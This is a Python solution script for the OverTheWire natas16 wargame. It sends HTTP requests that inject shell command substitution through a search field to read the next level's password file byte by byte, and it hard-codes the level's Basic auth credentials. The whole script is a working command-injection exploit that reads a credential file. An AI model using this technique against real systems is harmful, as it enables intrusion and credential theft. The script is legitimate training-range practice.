import socket
import re
import math
import time
r_ex=re.compile(r"HTTP/1.1 200 OK")
m_ex=re.compile(r"<pre>\n[A-Z]\n</pre>")
buf=bytearray()

#the login for natas15 basic auth username & password are combined with a colon then utf-8 base64 is applied. This becomes Http header.
#natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
#Authorization: Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA==
#URL codes are needed for spaces and the unbalanced quote
# %20 = space
# %22 = "


#open socket to send request
s=socket.socket(family=socket.AF_INET,type=socket.SOCK_STREAM,proto=0)
s.setblocking(1)
s.settimeout(5.0)
s.connect(("176.9.9.172",80))
#now we can try hacking!!

#we need to make effective request in a loop up to 32 characters long for the lenght of the password
#we are going to send an http request that will put the following string into the form field: ^$(cut -b{} /etc/natas_webpass/natas17)$
#from the first '^' to the last '$' will go to the server except the curly braces which are replaced by a number being the position of the byte in the password file. This number is incremented in the loop below.
#The ^ and last $ is for grep to match the start and end of a word. The $() is command substitution. The result of the command is substituted in to the grep expresion on the server.
#Byte by byte we will find lines in the dictionary on the server that match only one letter being the one we select from the password in natas17
n=-1
pwd=""
b=0
Fails=0
for c in range(0,32):
	match=False
	GotData=False
	request=bytes("GET /index.php?needle=^%24(cut+-b{}+%2Fetc%2Fnatas_webpass%2Fnatas17)%24&submit=Search HTTP/1.1\r\nHost: natas16.natas.labs.overthewire.org\r\nAuthorization: BASIC bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA==\r\n\r\n".format(b),"utf-8")
	while GotData==False:
		z=s.send(request)
		#print("SENT: Only {} of {} bytes sent".format(z,len(request)))
		#print("Waiting to send...")
		buf=s.recv(pow(2,16))
#		print("Buflen:{}".format(len(buf)))
		if len(buf)==0:
			print("ERR:No Data. Restart Connection")
			
			s.close()
			s=socket.socket(family=socket.AF_INET,type=socket.SOCK_STREAM,proto=0)
			s.setblocking(1)
			s.settimeout(5.0)
			s.connect(("176.9.9.172",80))
			Fails=Fails+1
			if Fails>3:
				
				s.close()
				print("Connection failed on third attempt. Exiting..")
				exit()
		else:
			GotData=True
			Fails=0
	str=buf.decode("utf-8")
#	print(str+"\n--{end html}--",end="\n\n\n\n")
	h=re.match(r_ex,str)
	if h is not None:
		m=re.search(m_ex,str)
		if m is not None:
			p=m.group()
			print("Matched Letter >"+p[6])
			pwd=pwd+p[6]
		else:
			pwd=pwd+"_"
		b=b+1
		print("pwd > "+pwd)
	else:
		print("HTTP Returned. NOT ok!")
#	re.purge()
#we have a request that can use looping to slowy get the password, try every letter until print(buf.decode("utf-8"))

s.close()
